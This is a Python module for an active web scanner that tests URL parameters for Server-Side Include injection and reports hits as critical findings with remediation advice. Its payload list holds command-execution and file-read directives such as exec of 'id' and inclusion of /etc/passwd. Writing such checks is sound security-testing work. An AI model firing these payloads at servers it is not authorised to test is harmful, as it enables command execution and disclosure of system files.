import copy
import re
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


class SsiInjectionCheck(BaseCheck):
    name = "active_ssi_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        payloads = [
            '<!--#exec cmd="id" -->',
            '<!--#exec cmd="whoami" -->',
            '<!--#printenv -->',
            '<!--#include virtual="/etc/passwd" -->',
            '<!--#echo var="DOCUMENT_NAME" -->',
            '<!--#fsize file="/etc/passwd" -->',
        ]
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for param in target_params:
                for payload in payloads:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        indicators = ["uid=", "gid=", "root:", "DOCUMENT_NAME", "SERVER_NAME", "SERVER_SOFTWARE"]
                        for indicator in indicators:
                            if indicator in resp.text:
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="critical",
                                    title="SSI injection detected",
                                    description=f"Parameter '{param}' with SSI payload '{payload[:50]}' executed server-side.",
                                    evidence=f"Payload: {payload}\nIndicator: {indicator}",
                                    remediation="Disable SSI (mod_include) if not required. If needed, restrict #exec directive.",
                                    cwe="CWE-97",
                                ))
                                break
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
